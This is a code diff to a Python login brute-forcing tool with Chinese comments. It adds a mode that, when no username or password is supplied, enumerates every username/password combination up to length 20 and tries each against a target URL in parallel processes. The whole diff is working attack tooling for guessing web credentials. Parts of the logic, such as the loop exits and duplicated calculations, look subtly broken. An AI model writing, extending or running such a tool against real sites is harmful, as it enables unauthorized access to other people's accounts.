@@ -66,71 +66,81 @@ def main():
 
     # 判斷模式：
     # 1. username only: auto-generate password (現有)
-    # 2. password only: auto-generate username (新功能)
+    # 2. password only: auto-generate username (現有)
     # 3. both: normal
-    # 4. neither: (可選)
+    # 4. neither: auto-generate all username/password combinations (新功能)
 
     if args.username and not args.passwords:
         # username only: auto-generate password (現有)
-        # ...原本密碼自動產生流程...
         is_gen_password = True
         is_gen_username = False
+        is_gen_both = False
     elif args.passwords and not args.username:
-        # password only: auto-generate username (新功能)
+        # password only: auto-generate username (現有)
         is_gen_password = False
         is_gen_username = True
+        is_gen_both = False
+    elif not args.username and not args.passwords:
+        # both missing: auto-generate all username/password combinations (新功能)
+        is_gen_password = False
+        is_gen_username = False
+        is_gen_both = True
     else:
         is_gen_password = False
         is_gen_username = False
+        is_gen_both = False
 
-    if is_gen_username:
-        # 只給 password，沒給 username，自動產生 username
-        # 取得 password_list
-        if os.path.isfile(args.passwords):
-            with open(args.passwords, encoding='utf-8') as f:
-                password_list = [line.strip() for line in f if line.strip()]
-        else:
-            password_list = [pw.strip() for pw in args.passwords.split(',') if pw.strip()]
-        # 產生 username 組合
-        max_un_length = min(args.max_length, 20)
+    if is_gen_both:
+        # 完全自動產生所有 username/password 組合
+        max_length = min(args.max_length, 20)
         charset = string.ascii_letters + string.digits + string.punctuation
         with Manager() as manager:
             found_flag = manager.Value('b', False)
-            for un_length in range(max_un_length, 0, -1):
-                if found_flag.value:
-                    break
-                print(f"[INFO] Trying all usernames of length {un_length}...")
-                total = len(charset) ** un_length
-                chunk_size = total // args.workers
-                processes = []
-                for i in range(args.workers):
-                    start = i * chunk_size
-                    end = (i+1) * chunk_size if i < args.workers - 1 else total
-                    # 每個 process 處理一段 username 組合，對每個 username 嘗試所有 password
-                    def worker_username_mode(start, end, charset, un_length, password_list, args, found_flag):
+            for un_length in range(max_length, 0, -1):
+                for pw_length in range(max_length, 0, -1):
+                    if found_flag.value:
+                        break
+                    print(f"[INFO] Trying all username/password combinations: username length {un_length}, password length {pw_length}...")
+                    total = (len(charset) ** un_length) * (len(charset) ** pw_length)
+                    chunk_size = total // args.workers
+                    processes = []
+                    def worker_both_mode(start, end, charset, un_length, pw_length, args, found_flag):
                         from .auto_brute import brute_force
-                        un_gen = username_range_generator(start, end, charset, un_length)
-                        if not found_flag.value:
+                        # 產生 username/password 組合
+                        for idx in range(start, end):
+                            uname_idx = idx // (len(charset) ** pw_length)
+                            pwd_idx = idx % (len(charset) ** pw_length)
+                            # 產生 username
+                            uname = index_to_password(uname_idx, charset, un_length)
+                            # 產生 password
+                            pwd = index_to_password(pwd_idx, charset, pw_length)
+                            # 嘗試登入
                             result = brute_force(
                                 url=args.url,
-                                username=un_gen,
-                                password_list=password_list,
+                                username=uname,
+                                password_list=[pwd],
                                 delay=args.delay,
                                 success_url=args.success_url,
                                 verbose=True
                             )
                             if result:
                                 found_flag.value = True
-                    p = Process(target=worker_username_mode, args=(start, end, charset, un_length, password_list, args, found_flag))
-                    p.start()
-                    processes.append(p)
-                for p in processes:
-                    p.join()
-                if found_flag.value:
-                    print(f"[INFO] Username found at length {un_length}, stopping further attempts.")
-                    break
+                                break
+                    total = (len(charset) ** un_length) * (len(charset) ** pw_length)
+                    chunk_size = total // args.workers
+                    for i in range(args.workers):
+                        start = i * chunk_size
+                        end = (i+1) * chunk_size if i < args.workers - 1 else total
+                        p = Process(target=worker_both_mode, args=(start, end, charset, un_length, pw_length, args, found_flag))
+                        p.start()
+                        processes.append(p)
+                    for p in processes:
+                        p.join()
+                    if found_flag.value:
+                        print(f"[INFO] Username/password found at username length {un_length}, password length {pw_length}, stopping further attempts.")
+                        break
             else:
-                print("[INFO] All username lengths tried, no login succeeded.")
+                print("[INFO] All username/password combinations tried, no login succeeded.")
         return
 
     password_list = None
